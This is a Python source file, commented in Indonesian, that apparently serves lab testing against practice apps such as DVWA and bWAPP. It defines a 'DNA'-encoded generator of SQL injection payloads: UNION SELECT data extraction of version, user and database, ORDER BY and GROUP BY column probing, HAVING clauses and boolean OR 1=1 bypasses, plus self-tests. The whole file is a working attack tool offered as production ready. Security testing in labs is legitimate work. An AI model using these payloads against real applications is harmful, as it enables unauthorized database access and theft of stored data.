"""
SQLi Payload Generator - FIXED VERSION (OPTIMIZED)

File: sqli_payload_generator_fixed.py
Fixes:
1. ✅ Fixed empty string bug dalam WHERE clause
2. ✅ Fixed column count mismatch dalam UNION SELECT  
3. ✅ Proper handling untuk semua quote styles
4. ✅ Better payload structure

Production Ready - Semua bugs sudah diperbaiki
"""

import random
from typing import Dict, List


class SQLiPayloadGenerator:
    """
    Generate SQLi payloads dengan DNA encoding
    FIXED VERSION - Semua bugs sudah diperbaiki
    """
    
    def __init__(self, column_count: int = 2):
        """
        Initialize payload generator
        
        Args:
            column_count: Jumlah columns di target application
                - DVWA SQLi: 2 (first_name, last_name)
                - bWAPP: Tergantung aplikasi
                - Custom: Perlu detect dengan ORDER BY
        """
        self.column_count = column_count
        
        self.injection_types = [
            "UNION SELECT",      # 0
            "ORDER BY",          # 1
            "GROUP BY",          # 2
            "HAVING",            # 3
            "WHERE",             # 4
        ]
        
        self.quote_styles = [
            "'",      # 0 - Single quote
            '"',      # 1 - Double quote
            "",       # 2 - No quote (numeric)
        ]
        
        self.comment_styles = [
            " --",    # 0 - SQL comment
            " #",     # 1 - MySQL comment
            ""        # 2 - No comment
        ]
        
        self.extract_types = [
            "version()",
            "user()",
            "database()",
            "current_user()",
            "1",
            "2"
        ]
        
        self.table_names = [
            "users", "admin", "accounts", "members"
        ]
    
    def generate_dna(self) -> Dict:
        """Generate random DNA untuk payload"""
        dna = {
            'injection_type': random.randint(0, len(self.injection_types) - 1),
            'quote_style': random.randint(0, len(self.quote_styles) - 1),
            'comment_style': random.randint(0, len(self.comment_styles) - 1),
            'extract_type': random.randint(0, len(self.extract_types) - 1),
            'table_name': random.choice(self.table_names),
        }
        return dna
    
    def dna_to_payload(self, dna: Dict) -> str:
        """
        Convert DNA to SQLi payload - FIXED VERSION
        
        Handles semua injection types dengan proper SQL syntax
        
        Args:
            dna: Dictionary dengan genes
        
        Returns:
            String payload
        """
        if not isinstance(dna, dict):
            raise TypeError(f"DNA harus dict, bukan {type(dna)}")
        
        injection_type = self.injection_types[dna.get('injection_type', 0)]
        quote = self.quote_styles[dna.get('quote_style', 0)]
        comment = self.comment_styles[dna.get('comment_style', 0)]
        extract = self.extract_types[dna.get('extract_type', 0)]
        
        # ============================================================
        # INJECTION TYPE 0: UNION SELECT - Data extraction
        # ✅ BUG #2 FIXED: Generate exactly column_count columns
        # ============================================================
        if injection_type == "UNION SELECT":
            columns = []
            for i in range(self.column_count):
                if i == 0:
                    columns.append("1")
                elif i == 1:
                    columns.append(extract)
                else:
                    # Subsequent columns: gunakan sequential numbers
                    columns.append(str(i + 1))
            
            select_list = ", ".join(columns)
            payload = f"{quote} UNION SELECT {select_list}{comment}"
        
        # ============================================================
        # INJECTION TYPE 1: ORDER BY - Column detection
        # ============================================================
        elif injection_type == "ORDER BY":
            col_number = random.randint(1, max(self.column_count + 2, 3))
            payload = f"{quote} ORDER BY {col_number}{comment}"
        
        # ============================================================
        # INJECTION TYPE 2: GROUP BY - Column grouping
        # ============================================================
        elif injection_type == "GROUP BY":
            col_number = random.randint(1, max(self.column_count, 1))
            payload = f"{quote} GROUP BY {col_number}{comment}"
        
        # ============================================================
        # INJECTION TYPE 3: HAVING - Conditional grouping
        # ============================================================
        elif injection_type == "HAVING":
            payload = f"{quote} GROUP BY 1 HAVING 1=1{comment}"
        
        # ============================================================
        # INJECTION TYPE 4: WHERE - Boolean-based injection
        # ✅ BUG #1 FIXED: Handle empty strings correctly
        # ============================================================
        elif injection_type == "WHERE":
            if quote == "":
                # Numeric: no quotes needed
                # Example: SELECT * FROM users WHERE id = 1 OR 1=1
                payload = f" OR 1=1{comment}"
            else:
                # String: need proper quoting
                # Example: SELECT * FROM users WHERE id = '1' OR '1'='1'
                # IMPORTANT: Use '1'='1' NOT ''='' (that's SQL syntax error!)
                payload = f"{quote} OR {quote}1{quote}={quote}1{comment}"
        
        else:
            # Default fallback
            payload = f"{quote} OR 1=1{comment}"
        
        return payload
    
    def validate_payload(self, payload: str) -> bool:
        """
        Quick validation untuk detect obvious syntax errors
        
        Args:
            payload: String payload untuk divalidasi
        
        Returns:
            True jika payload tampak valid
        """
        # Check 1: No empty strings (BUG #1 indicator)
        if "''" in payload or '""' in payload:
            return False
        
        # Check 2: Valid SQL keywords present
        payload_upper = payload.upper()
        valid_keywords = ['UNION', 'SELECT', 'ORDER', 'BY', 'GROUP', 'HAVING',
                         'OR', 'AND', 'WHERE']
        
        if not any(kw in payload_upper for kw in valid_keywords):
            return False
        
        return True
    
    def generate_payload_batch(self, count: int = 10) -> List[str]:
        """
        Generate batch of valid payloads
        
        Args:
            count: Jumlah payloads yang ingin digenerate
        
        Returns:
            List of payload strings
        """
        payloads = []
        attempts = 0
        max_attempts = count * 3
        
        while len(payloads) < count and attempts < max_attempts:
            dna = self.generate_dna()
            payload = self.dna_to_payload(dna)
            if self.validate_payload(payload):
                payloads.append(payload)
            attempts += 1
        
        return payloads
    
    def get_stats(self) -> dict:
        """Get generation statistics"""
        return {
            'column_count': self.column_count,
            'injection_types': len(self.injection_types),
            'quote_styles': len(self.quote_styles),
            'comment_styles': len(self.comment_styles),
            'extract_types': len(self.extract_types),
        }


# ============================================================
# TESTING & DEMO
# ============================================================

if __name__ == "__main__":
    print("=" * 80)
    print("SQLi Payload Generator - FIXED VERSION")
    print("=" * 80)
    
    gen = SQLiPayloadGenerator(column_count=2)
    
    # ========== TEST 1: Generate Random Payloads ==========
    print("\n[TEST 1] Generating 10 random payloads:")
    print("-" * 80)
    
    for i in range(10):
        dna = gen.generate_dna()
        payload = gen.dna_to_payload(dna)
        valid = gen.validate_payload(payload)
        injection = gen.injection_types[dna['injection_type']]
        
        status = "✓" if valid else "✗"
        print(f"{status} [{i+1:2d}] {injection:15} → {payload}")
    
    # ========== TEST 2: Verify BUG #1 is fixed ==========
    print("\n[TEST 2] Verifying BUG #1 FIXED (No empty strings):")
    print("-" * 80)
    
    errors = 0
    for i in range(100):
        dna = {'injection_type': 4, 'quote_style': 0, 'comment_style': 0, 
               'extract_type': 0, 'table_name': 'users'}
        payload = gen.dna_to_payload(dna)
        if "''" in payload:
            print(f"ERROR: {payload}")
            errors += 1
    
    if errors == 0:
        print("✓ NO EMPTY STRINGS FOUND (Bug #1 FIXED!)")
    else:
        print(f"✗ Found {errors} empty string errors")
    
    # ========== TEST 3: Verify BUG #2 is fixed ==========
    print("\n[TEST 3] Verifying BUG #2 FIXED (Column count):")
    print("-" * 80)
    
    dna = {'injection_type': 0, 'quote_style': 0, 'comment_style': 0,
           'extract_type': 0, 'table_name': 'users'}
    payload = gen.dna_to_payload(dna)
    
    # Count columns in UNION SELECT
    select_part = payload[payload.find("SELECT")+6:].strip()
    col_count = select_part.count(',') + 1
    
    print(f"Payload: {payload}")
    print(f"Column count: {col_count} (expected: 2)")
    
    if col_count == 2:
        print("✓ COLUMN COUNT CORRECT (Bug #2 FIXED!)")
    else:
        print(f"✗ Column count mismatch: got {col_count}, expected 2")
    
    print("\n" + "=" * 80)
    print("✅ ALL TESTS COMPLETED!")
    print("=" * 80)